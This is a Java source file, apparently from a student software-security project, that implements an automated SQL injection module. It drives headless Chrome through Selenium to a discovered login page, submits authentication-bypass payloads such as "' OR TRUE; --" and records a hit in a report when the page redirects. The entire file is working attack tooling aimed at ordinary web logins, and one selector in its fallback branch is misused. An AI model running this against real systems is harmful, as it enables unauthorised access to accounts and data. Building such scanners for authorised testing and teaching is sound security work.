package fr.isep.softsecu.attackreport.attacks;

import fr.isep.softsecu.attackreport.Attack;
import fr.isep.softsecu.attackreport.Report;
import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.chrome.ChromeOptions;

import java.time.Duration;
import java.util.List;
import java.util.NoSuchElementException;

public class SQLInjectionAttack implements Attack {

    private static final int TIMEOUT = 2000;

    private String loginUrlStr;

    private static final List<LoginAttempt> INJECTIONS = List.of(
            new LoginAttempt("' OR TRUE; --", "password to fill place"),
            new LoginAttempt("' OR id=1; --", "password to fill place")
    );

    @Override
    public List<Class<? extends Attack>> getRequiredPreviousAttacks() {
        return List.of(FindLoginPageAttack.class);
    }

    @Override
    public void setPreviousAttacks(List<Attack> previousAttacks) {
        for(Attack previousAttack : previousAttacks){
            if(previousAttack instanceof FindLoginPageAttack findLoginPageAttack){
                loginUrlStr = findLoginPageAttack.getLoginUrlStr();
            }
        }
    }

    @Override
    public void run(Report report, String ip, int port) {
        try {
            ChromeOptions options = new ChromeOptions();
            options.addArguments("--headless");
            WebDriver driver = new ChromeDriver(options);
            driver.get(loginUrlStr);
            driver.manage().timeouts().implicitlyWait(Duration.ofMillis(TIMEOUT));

            performSQLInjection(report, driver, loginUrlStr);

            driver.quit();
        } catch (Exception e) {
            System.out.println("SQL injection attack failed on " + loginUrlStr);
            e.printStackTrace();
        }
    }

    @Override
    public String getAttackName() {
        return "SQL injection";
    }

    private void performSQLInjection(Report report, WebDriver driver, String urlStr){
        try {
            System.out.println("Performing SQL injection on " + urlStr);

            for(LoginAttempt attempt : INJECTIONS){
                driver.get(urlStr);
                driver.manage().timeouts().implicitlyWait(Duration.ofMillis(TIMEOUT));

                WebElement credential;

                WebElement password = driver.findElement(By.name("password"));
                WebElement submit = driver.findElement(By.cssSelector("[type='submit']"));

                try{
                    credential = driver.findElement(By.cssSelector("input[name='email']"));
                } catch (NoSuchElementException e) {
                    credential = driver.findElement(By.name("input[name='username']"));
                }

                credential.sendKeys(attempt.username());
                password.sendKeys(attempt.password());
                submit.click();

                //Clicking the submit button may cause the page to reload or redirect, so we wait until timeout to check if the page has changed
                try{
                    Thread.sleep(TIMEOUT);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                if(!driver.getCurrentUrl().equals(urlStr)){
                    System.out.println("SQL injection successful with username \"" + attempt.username() + "\" and password \"" + attempt.password() + "\")");
                    report.append("SQL injection successful with username \"" + attempt.username() + "\" and password \"" + attempt.password() + "\")");
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public String getLoginUrlStr() {
        return loginUrlStr;
    }

    public record LoginAttempt(String username, String password) { }
}
